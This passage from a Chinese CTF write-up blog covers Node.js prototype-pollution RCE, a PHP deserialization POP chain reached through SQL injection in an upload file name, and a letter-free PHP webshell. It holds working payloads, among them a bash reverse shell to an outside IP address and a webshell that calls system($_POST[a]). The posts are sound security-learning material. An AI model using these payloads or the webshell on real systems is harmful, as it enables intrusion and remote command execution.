<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">/action</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">同时将改为Content-type: application/json</span><br></pre></td></tr></table></figure>
<p>再访问/info即可下载flag</p>
<p>也可以反弹shell，来执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/118.31.168.198/39543 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/12347705.html]">https://www.cnblogs.com/escape-w/p/12347705.html]</a></p>
<pre><code>[https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html]

[https://blog.csdn.net/qq_45691294/article/details/109320437]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-pop链5之sql注入的反序列化利用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/20/pop%E9%93%BE5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/" class="article-date">
  	<time datetime="2021-10-19T16:00:00.000Z" itemprop="datePublished">2021-10-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/20/pop%E9%93%BE5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/">
        pop链5之sql注入的反序列化利用
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="pop链5之sql注入的反序列化利用"><a href="#pop链5之sql注入的反序列化利用" class="headerlink" title="pop链5之sql注入的反序列化利用"></a>pop链5之sql注入的反序列化利用</h1><p>我们打开页面后，发现一个关键点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powered By wowouploadimage </span><br></pre></td></tr></table></figure>
<p>我们可以在github里下载源码，，发现有几个php文件，分别是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">helper.php</span><br><span class="line">show.php</span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure>
<p>通过对源码的大概审计，发现helper.php是主要的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class helper &#123;</span><br><span class="line">	protected $folder = &quot;pic/&quot;;</span><br><span class="line">	protected $ifview = False; </span><br><span class="line">	protected $config = &quot;config.txt&quot;;</span><br><span class="line">	// The function is not yet perfect, it is not open yet.</span><br><span class="line"></span><br><span class="line">	public function upload($input=&quot;file&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		$fileinfo = $this-&gt;getfile($input);</span><br><span class="line">		$array = array();</span><br><span class="line">		$array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;];</span><br><span class="line">		$array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;];</span><br><span class="line">		$array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;];</span><br><span class="line">		$array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;];</span><br><span class="line">		$img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);</span><br><span class="line">		$my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">		$array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">		$id = $this-&gt;save($array);</span><br><span class="line">		if ($id == 0)&#123;</span><br><span class="line">			die(&quot;Something wrong!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function getfile($input)</span><br><span class="line">	&#123;</span><br><span class="line">		if(isset($input))&#123;</span><br><span class="line">			$rs = $this-&gt;check($_FILES[$input]);</span><br><span class="line">		&#125;</span><br><span class="line">		return $rs;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function check($info)</span><br><span class="line">	&#123;</span><br><span class="line">		$basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">		$filename = $info[&quot;name&quot;];</span><br><span class="line">		$ext = substr(strrchr($filename, &#x27;.&#x27;), 1);</span><br><span class="line">		$cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">		if(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">			die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	    $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename);</span><br><span class="line">	    return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function save($data)</span><br><span class="line">	&#123;</span><br><span class="line">		if(!$data || !is_array($data))&#123;</span><br><span class="line">			die(&quot;Something wrong!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$id = $this-&gt;insert_array($data);</span><br><span class="line">		return $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert_array($data)</span><br><span class="line">	&#123;	</span><br><span class="line">		$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);</span><br><span class="line">		if (mysqli_connect_errno($con)) </span><br><span class="line">		&#123; </span><br><span class="line">		    die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());</span><br><span class="line">		&#125;</span><br><span class="line">		$sql_fields = array();</span><br><span class="line">		$sql_val = array();</span><br><span class="line">		foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">			$key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $key);</span><br><span class="line">			$value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $value);</span><br><span class="line">			$sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;</span><br><span class="line">			$sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">		mysqli_query($con, $sql);</span><br><span class="line">		$id = mysqli_insert_id($con);</span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		return $id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function view_files($path)&#123;</span><br><span class="line">		if ($this-&gt;ifview == False)&#123;</span><br><span class="line">			return False;</span><br><span class="line">			//The function is not yet perfect, it is not open yet.</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		echo $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		# Read some config html</span><br><span class="line">		$this-&gt;view_files($this-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>我们查看上传文件的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function upload($input=&quot;file&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	$fileinfo = $this-&gt;getfile($input);</span><br><span class="line">	$array = array();</span><br><span class="line">	$array[&quot;title&quot;] = $fileinfo[&#x27;title&#x27;];</span><br><span class="line">	$array[&quot;filename&quot;] = $fileinfo[&#x27;filename&#x27;];</span><br><span class="line">	$array[&quot;ext&quot;] = $fileinfo[&#x27;ext&#x27;];</span><br><span class="line">	$array[&quot;path&quot;] = $fileinfo[&#x27;path&#x27;];</span><br><span class="line">	$img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]);</span><br><span class="line">	$my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]);</span><br><span class="line">	$array[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">	$id = $this-&gt;save($array);</span><br><span class="line">	if ($id == 0)&#123;</span><br><span class="line">		die(&quot;Something wrong!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is $id.&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现一个序列化的点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;attr&quot;] = serialize($my_ext);</span><br></pre></td></tr></table></figure>
<p>而且，通过审计helper.php源码，还发现了一个危险的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	public function view_files($path)&#123;</span><br><span class="line">		if ($this-&gt;ifview == False)&#123;</span><br><span class="line">			return False;</span><br><span class="line">			//The function is not yet perfect, it is not open yet.</span><br><span class="line">		&#125;</span><br><span class="line">		$content = file_get_contents($path);</span><br><span class="line">		echo $content;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		# Read some config html</span><br><span class="line">		$this-&gt;view_files($this-&gt;config);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过对上面代码的审计，发现只要我们在销毁对象时，即可使用file_get_contents()函数，来读取信息，所以我们可以构造exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class helper&#123;</span><br><span class="line">	protected $ifview=true;</span><br><span class="line">	protected $config=/flag;</span><br><span class="line">&#125;</span><br><span class="line">$a=new helper();</span><br><span class="line">echo bin2hex(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们寻找反序列化的点，发现在show.php文件中有一个反序列化的点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$attr = unserialize($attr_temp);</span><br></pre></td></tr></table></figure>
<p>然后我们在helper.php文件中，从getfile()函数可以指到check()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function check($info)</span><br><span class="line">&#123;</span><br><span class="line">	$basename = substr(md5(time().uniqid()),9,16);</span><br><span class="line">	$filename = $info[&quot;name&quot;];</span><br><span class="line">	$ext = substr(strrchr($filename, &#x27;.&#x27;), 1);</span><br><span class="line">	$cate_exts = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">	if(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">		die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    $title = str_replace(&quot;.&quot;.$ext,&#x27;&#x27;,$filename);</span><br><span class="line">    return array(&#x27;title&#x27;=&gt;$title,&#x27;filename&#x27;=&gt;$basename.&quot;.&quot;.$ext,&#x27;ext&#x27;=&gt;$ext,&#x27;path&#x27;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>知道上传文件中各变量的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;title&quot;]：去掉后缀的文件名</span><br><span class="line">$array[&quot;filename&quot;]：substr(md5(time().uniqid()),9,16)加上后缀</span><br><span class="line">$array[&quot;ext&quot;]：上传文件名后缀</span><br><span class="line">$array[&quot;path&quot;]：路径信息</span><br><span class="line">$array[&quot;attr&quot;]：反序列化后的图片长宽信息</span><br></pre></td></tr></table></figure>
<p>然后再看回show.php文件的Get_All_Images()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public function Get_All_Images()&#123;</span><br><span class="line">	$sql = &quot;SELECT * FROM images&quot;;</span><br><span class="line">	$result = mysqli_query($this-&gt;con, $sql);</span><br><span class="line">	if ($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">	    while($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">	    	if($row[&quot;attr&quot;])&#123;</span><br><span class="line">	    		$attr_temp = str_replace(&#x27;\0\0\0&#x27;, chr(0).&#x27;*&#x27;.chr(0), $row[&quot;attr&quot;]);</span><br><span class="line">				$attr = unserialize($attr_temp);</span><br><span class="line">			&#125;</span><br><span class="line">	        echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">	    echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	mysqli_close($this-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可知会将上传文件的长宽的序列化信息进行反序列化，这是我们可以利用的点，来输入我们构造的序列化信息，进行变量覆盖，从而利用file_get_contents()读取flag信息，而这里是提取数据库中的信息，所以我们需要找一个sql注入的点，而我们可以看helper.php文件中的save()函数，然后save()函数指向insert_array()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public function insert_array($data)</span><br><span class="line">&#123;	</span><br><span class="line">	$con = mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;pic_base&quot;);</span><br><span class="line">	if (mysqli_connect_errno($con)) </span><br><span class="line">	&#123; </span><br><span class="line">	    die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());</span><br><span class="line">	&#125;</span><br><span class="line">	$sql_fields = array();</span><br><span class="line">	$sql_val = array();</span><br><span class="line">	foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">		$key_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $key);</span><br><span class="line">		$value_temp = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;\0\0\0&#x27;, $value);</span><br><span class="line">		$sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;;</span><br><span class="line">		$sql_val[] = &quot;&#x27;&quot;.$value_temp.&quot;&#x27;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</span><br><span class="line">	mysqli_query($con, $sql);</span><br><span class="line">	$id = mysqli_insert_id($con);</span><br><span class="line">	mysqli_close($con);</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见它会将上传文件的那些变量信息写入数据库中，然后我们访问show.php文件，触发反序列化，从而将我们构造在图片长宽的序列化数据进行反序列化，从而使用file_get_contents()函数来读取flag，从check()函数中，我们发现只可以从title变量下手，所以我们可以先上传一个文件，然后文件名为我们构造的传入数据库的信息，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#&quot;</span><br></pre></td></tr></table></figure>
<p>再访问一下show.php就可以看见flag了</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-不包含数字和字母的webshell" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/19/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/" class="article-date">
  	<time datetime="2021-10-18T16:00:00.000Z" itemprop="datePublished">2021-10-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/19/%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/">
        不包含数字和字母的webshell
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="不包含数字和字母的webshell"><a href="#不包含数字和字母的webshell" class="headerlink" title="不包含数字和字母的webshell"></a>不包含数字和字母的webshell</h1><p>打开页面，发现有个文件上传，同时看到有一串代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</span><br><span class="line">    $data=substr($contents,5);</span><br><span class="line">    foreach ($black_char as $b) &#123;</span><br><span class="line">        if (stripos($data, $b) !== false)&#123;</span><br><span class="line">            die(&quot;illegal char&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>通过对代码的审计，我们可以发现，它对我们上传文件的内容有字符数量的限制和字符的过滤，所以我们可以写个exp来fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;shell.txt&quot;,&quot;w&quot;) as f:</span><br><span class="line">    for i in range(127):</span><br><span class="line">        if i&gt;=32:</span><br><span class="line">            f.write(chr(i)+chr(i)+chr(i)+chr(i)+chr(i)+&#x27;\n&#x27;)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
<p>发现几乎所有的字母和数字都被过滤了，因此我们可以想使用不包含数字和字母的webshell，来传马，因此，我们可以利用UTF-8编码中的某个汉字，然后将其某个某个字符取出来，然后取反的操作，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$__=$_.$_;</span><br><span class="line">$___=($_==$__);</span><br><span class="line">$____=($_==$_);</span><br><span class="line">echo ~(&#x27;区&#x27;&#123;1&#125;);</span><br><span class="line"></span><br><span class="line">echo ~区[$____];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>所以我们可以利用这种方式构造上传的马，为了方便，我们的php开头可以使用短标签&lt;?=，因此exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=                //PHP中的另外一个短标签&lt;?=，代替&lt;?php</span><br><span class="line">$_=[];             //array</span><br><span class="line">$__=$_.$_;         //arrayarray </span><br><span class="line">$_=($_==$__);      //不成立 false --&gt;0</span><br><span class="line">$__=($_==$_);      //成立   true  --&gt;1</span><br><span class="line">$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];  //system</span><br><span class="line">$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];         //_Post</span><br><span class="line">$___($$____[~瞎[$__]]);   //system($_POST[a]);</span><br></pre></td></tr></table></figure>
<p>提交后，我们可以得到文件的路径，然后我们构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ip/upload/d30c18bfaf06a96a29e316bbb21b7ac9.php</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">a=env</span><br></pre></td></tr></table></figure>
<p>env是显示当前系统中已存在的环境，因为我们在系统目录中找不到flag，所以我们可以使用env，看一下flag是否存在</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html]">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html]</a></p>
<pre><code>[https://blog.csdn.net/qq_46263951/article/details/118816182?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-CRLF漏洞以及SoapClinet触发反序列化" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  	<time datetime="2021-10-17T16:00:00.000Z" itemprop="datePublished">2021-10-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/18/CRLF%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8ASoapClinet%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        CRLF漏洞以及SOAP漏洞利用之CRLF与SSRF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
